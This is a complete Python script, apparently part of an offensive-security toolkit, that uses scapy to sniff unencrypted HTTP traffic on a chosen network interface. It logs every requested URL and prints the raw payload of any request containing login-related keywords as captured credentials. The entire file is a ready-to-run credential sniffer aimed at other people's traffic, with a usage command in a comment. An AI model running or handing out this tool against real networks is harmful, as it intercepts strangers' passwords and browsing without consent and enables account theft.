#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers.http import HTTPRequest  # Import HTTP layer
import argparse

# python3 packetSniffer.py -i enp0s3

def get_arguments():
    parser = argparse.ArgumentParser(description="Packet sniffer to extract URLs and HTTP credentials")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff")
    args = parser.parse_args()
    return args


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")


def get_url(packet):
    host = packet[HTTPRequest].Host.decode() if packet[HTTPRequest].Host else ""
    path = packet[HTTPRequest].Path.decode() if packet[HTTPRequest].Path else ""
    return f"http://{host}{path}"


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode(errors="ignore")
        keywords = ["username", "user", "login", "password", "pass", "email"]
        for keyword in keywords:
            if keyword in payload:
                return payload
    return None


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP Request: {url}")

        credentials = get_credentials(packet)
        if credentials:
            print(f"\n[!] Possible Credentials: {credentials}\n")


if __name__ == "__main__":
    args = get_arguments()
    sniff(args.interface)

